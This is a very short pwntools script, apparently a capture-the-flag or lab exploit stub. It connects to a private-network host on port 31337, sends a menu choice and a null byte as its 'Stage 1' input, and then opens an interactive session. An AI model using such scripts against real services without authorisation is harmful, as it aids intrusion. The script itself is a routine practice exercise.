from pwn import *

r = remote("172.16.37.128", 31337)

# Stage 1
r.sendline("1")
r.sendline("\x00")

# Stage 2
r.interactive()
